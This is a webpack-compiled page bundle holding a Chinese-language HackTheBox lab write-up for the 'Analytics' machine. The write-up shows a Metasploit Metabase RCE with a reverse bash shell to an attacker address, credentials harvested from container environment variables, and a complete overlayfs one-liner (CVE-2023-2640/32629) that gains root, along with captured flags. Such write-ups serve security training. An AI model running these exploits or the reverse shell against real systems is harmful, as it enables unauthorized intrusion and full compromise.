"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[4495],{78898:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>r,metadata:()=>o,toc:()=>l});var a=t(85893),s=t(11151);const r={},i="Analytics",o={id:"HackTheBox/Machines/Analytics/index",title:"Analytics",description:"Difficulty: Easy",source:"@site/docs/HackTheBox/Machines/Analytics/index.md",sourceDirName:"HackTheBox/Machines/Analytics",slug:"/HackTheBox/Machines/Analytics/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Analytics/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Analytics/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Machines",permalink:"/Target-Machines-WriteUp/docs/category/HackTheBox-Machines"},next:{title:"Bizness",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/"}},c={},l=[{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"\u63a2\u6d4b web \u670d\u52a1",id:"\u63a2\u6d4b-web-\u670d\u52a1",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:2},{value:"PEASS-ng",id:"peass-ng",level:3},{value:"deepce",id:"deepce",level:3},{value:"User - metalytics",id:"user---metalytics",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-1",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"analytics",children:"Analytics"})}),"\n",(0,a.jsxs)(n.admonition,{type:"info",children:[(0,a.jsx)(n.p,{children:"Difficulty: Easy"}),(0,a.jsx)(n.p,{children:"Operating System: Linux"})]}),"\n",(0,a.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.11.233"',children:"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://analytical.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63a2\u6d4b-web-\u670d\u52a1",children:"\u63a2\u6d4b web \u670d\u52a1"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-html",metastring:'title="http get 10.10.11.233:80"',children:"HTTP/1.1 302 Moved Temporarily\nConnection: keep-alive\nContent-Length: 154\nContent-Type: text/html\nDate: Thu, 14 Mar 2024 01:52:53 GMT\nLocation: http://analytical.htb/\nServer: nginx/1.18.0 (Ubuntu)\n\n<html>\n<head><title>302 Found</title></head>\n<body>\n<center><h1>302 Found</h1></center>\n<hr><center>nginx/1.18.0 (Ubuntu)</center>\n</body>\n</html>\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728 ",(0,a.jsx)(n.code,{children:"/etc/hosts"})," \u6587\u4ef6\u4e2d\u6dfb\u52a0\u89e3\u6790\u8bb0\u5f55\u540e\u518d\u6b21\u8bbf\u95ee"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(90945).Z+"",width:"2560",height:"1371"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728\u53f3\u4e0a\u89d2\u7684 ",(0,a.jsx)(n.code,{children:"Login"})," \u529f\u80fd\u70b9\uff0c\u5b9e\u8d28\u4e0a\u662f\u8df3\u8f6c\u5230 ",(0,a.jsx)(n.code,{children:"http://data.analytical.htb/"})," \u7684\u94fe\u63a5\uff0c\u518d\u6b21\u5728 ",(0,a.jsx)(n.code,{children:"/etc/hosts"})," \u6587\u4ef6\u4e2d\u6dfb\u52a0\u89e3\u6790\u8bb0\u5f55\u540e\u518d\u6b21\u8bbf\u95ee"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:t(93978).Z+"",width:"1688",height:"936"})}),"\n",(0,a.jsx)(n.p,{children:"\u5df2\u77e5 Metabase \u5b58\u5728 CVE \u6f0f\u6d1e\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 Metasploit \u8fdb\u884c\u653b\u51fb"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'msf6 exploit(linux/http/metabase_setup_token_rce) > show options\n\nModule options (exploit/linux/http/metabase_setup_token_rce):\n\n   Name       Current Setting      Required  Description\n   ----       ---------------      --------  -----------\n   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.11.233         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT      3000                 yes       The target port (TCP)\n   SSL        false                no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /                    yes       The URI of the Metabase Application\n   VHOST      data.analytical.htb  no        HTTP server virtual host\n\n\nPayload options (cmd/unix/reverse_bash):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.16.2       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Target\n\nmsf6 exploit(linux/http/metabase_setup_token_rce) > exploit\n\n[*] Started reverse TCP handler on 10.10.16.2:4444\n[*] Running automatic check ("set AutoCheck false" to disable)\n[+] The target appears to be vulnerable. Version Detected: 0.46.6\n[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f\n[*] Sending exploit (may take a few seconds)\n[*] Command shell session 1 opened (10.10.16.2:4444 -> 10.10.11.233:57118) at 2024-03-14 09:57:43 +0800\n\nwhoami\nmetabase\n'})}),"\n",(0,a.jsx)(n.h2,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.h3,{id:"peass-ng",children:"PEASS-ng"}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u811a\u672c\u7684\u6267\u884c\u7ed3\u679c\u4e2d\uff0c\u6ce8\u610f\u5230"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Protections\n\u2550\u2563 AppArmor enabled? .............. AppArmor Not Found\n\u2550\u2563 AppArmor profile? .............. docker-default (enforce)\n\u2550\u2563 is linuxONE? ................... s390x Not Found\n\u2550\u2563 grsecurity present? ............ grsecurity Not Found\n\u2550\u2563 PaX bins present? .............. PaX Not Found\n\u2550\u2563 Execshield enabled? ............ Execshield Not Found\n\u2550\u2563 SELinux enabled? ............... sestatus Not Found\n\u2550\u2563 Seccomp enabled? ............... enabled\n\u2550\u2563 User namespace? ................ enabled\n\u2550\u2563 Cgroup2 enabled? ............... enabled\n\u2550\u2563 Is ASLR enabled? ............... Yes\n\u2550\u2563 Printer? ....................... No\n\u2550\u2563 Is this a virtual machine? ..... Yes\n\n                                   \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container \u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n                                   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container related tools present (if any):\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Am I Containered?\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container details\n\u2550\u2563 Is this a container? ........... docker\n\u2550\u2563 Any running containers? ........ No\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Docker Container details\n\u2550\u2563 Am I inside Docker group ....... No\n\u2550\u2563 Looking and enumerating Docker Sockets (if any):\n\u2550\u2563 Docker version ................. Not Found\n\u2550\u2563 Vulnerable to CVE-2019-5736 .... Not Found\n\u2550\u2563 Vulnerable to CVE-2019-13139 ... Not Found\n\u2550\u2563 Rootless Docker? ............... No\n\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container & breakout enumeration\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout\n\u2550\u2563 Container ID ................... e38f48e8dca3\n\n\u2550\u2563 Container Full ID .............. /\n\u2550\u2563 Seccomp enabled? ............... enabled\n\u2550\u2563 AppArmor profile? .............. docker-default (enforce)\n\u2550\u2563 User proc namespace? ........... enabled         0          0 4294967295\n\u2550\u2563 Vulnerable to CVE-2019-5021 .... No\n\n\u2550\u2550\u2563 Breakout via mounts\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts\n\u2550\u2563 /proc mounted? ................. Yes\n\u2550\u2563 /dev mounted? .................. No\n\u2550\u2563 Run ushare ..................... No\n\u2550\u2563 release_agent breakout 1........ No\n\u2550\u2563 release_agent breakout 2........ No\n\u2550\u2563 core_pattern breakout .......... No\n\u2550\u2563 binfmt_misc breakout ........... No\n\u2550\u2563 uevent_helper breakout ......... No\n\u2550\u2563 is modprobe present ............ lrwxrwxrwx    1 root     root            12 Jun 14 15:03 /sbin/modprobe -> /bin/busybox\n\u2550\u2563 DoS via panic_on_oom ........... No\n\u2550\u2563 DoS via panic_sys_fs ........... No\n\u2550\u2563 DoS via sysreq_trigger_dos ..... No\n\u2550\u2563 /proc/config.gz readable ....... No\n\u2550\u2563 /proc/sched_debug readable ..... No\n\u2550\u2563 /proc/*/mountinfo readable ..... No\n\u2550\u2563 /sys/kernel/security present ... Yes\n\u2550\u2563 /sys/kernel/security writable .. No\n\n\u2550\u2550\u2563 Namespaces\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces\ntotal 0\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 cgroup -> cgroup:[4026532647]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 ipc -> ipc:[4026532588]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 mnt -> mnt:[4026532586]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 net -> net:[4026532590]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 pid -> pid:[4026532589]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 pid_for_children -> pid:[4026532589]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 time -> time:[4026531834]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 time_for_children -> time:[4026531834]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 user -> user:[4026531837]\nlrwxrwxrwx    1 metabase metabase         0 Oct 10 14:07 uts -> uts:[4026532587]\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Container Capabilities\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape\nCapInh: 0000000000000000\nCapPrm: 0000000000000000\nCapEff: 0000000000000000\nCapBnd: 00000000a00425f9\nCapAmb: 0000000000000000\nRun capsh --decode=<hex> to decode the capabilities\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Privilege Mode\nPrivilege Mode is disabled\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Interesting Files Mounted\n526 467 8:2 /var/lib/docker/containers/e38f48e8dca3cd444001b7f83a37486531678e6dd7d5359de02c67a3e079fde6/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda2 rw\n527 467 8:2 /var/lib/docker/containers/e38f48e8dca3cd444001b7f83a37486531678e6dd7d5359de02c67a3e079fde6/hostname /etc/hostname rw,relatime - ext4 /dev/sda2 rw\n528 467 8:2 /var/lib/docker/containers/e38f48e8dca3cd444001b7f83a37486531678e6dd7d5359de02c67a3e079fde6/hosts /etc/hosts rw,relatime - ext4 /dev/sda2 rw\n\n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Possible Entrypoints\n-rwxr-xr-x    1 metabase metabase  828.5K Oct 10 14:07 /tmp/linpeas.sh\n-rwxr-xr-x    1 root     root        6.8K Jun 29 20:39 /app/run_metabase.sh\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u8bf4\u660e\u8fd9\u4e2a Metabase \u662f\u90e8\u7f72\u5728 Docker \u5185\u7684"}),"\n",(0,a.jsx)(n.h3,{id:"deepce",children:"deepce"}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u811a\u672c\u7684\u6267\u884c\u7ed3\u679c\u4e2d\uff0c\u6ce8\u610f\u5230\u73af\u5883\u53d8\u91cf\u4e2d\u5b58\u5728\u51ed\u636e\u4fe1\u606f"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"====================================(Interesting Files)=====================================\n[+] Interesting environment variables ... Yes\n......\nMETA_PASS=An4lytics_ds20223#\nMETA_USER=metalytics\n"})}),"\n",(0,a.jsx)(n.h2,{id:"user---metalytics",children:"User - metalytics"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs metalytics@10.10.11.233\n[10:02:02] Welcome to pwncat \ud83d\udc08!\nPassword: ******************\n[10:02:20] 10.10.11.233:22: registered new host w/ db\n(local) pwncat$ back\n(remote) metalytics@analytics:/home/metalytics$ whoami\nmetalytics\n"})}),"\n",(0,a.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) metalytics@analytics:/home/metalytics$ cat user.txt\n53039b0f294045968eda95de651b4669\n"})}),"\n",(0,a.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-1",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"(remote) metalytics@analytics:/home/metalytics$ uname -a\nLinux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u76f4\u63a5\u5229\u7528 ",(0,a.jsx)(n.code,{children:"CVE-2023-2640 (CVSS 7.8)"})," \u548c ",(0,a.jsx)(n.code,{children:"CVE-2023-32629 (CVSS 7.8)"})," \u8fdb\u884c\u653b\u51fb"]}),"\n",(0,a.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'(remote) metalytics@analytics:/home/metalytics$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c \'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")\'\nroot@analytics:~# whoami\nroot\n'})}),"\n",(0,a.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"root@analytics:/root# cat root.txt\n0f7d6fee56e47daabdf41eafb9b0ae3e\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},93978:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/image_20240348-094850-7c272a68281672ef39a962b9885fe03f.png"},90945:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/image_20240354-095440-7be60f6f1b4018ac8ea5b796aa54e414.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>i});var a=t(67294);const s={},r=a.createContext(s);function i(e){const n=a.useContext(r);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),a.createElement(r.Provider,{value:n},e.children)}}}]);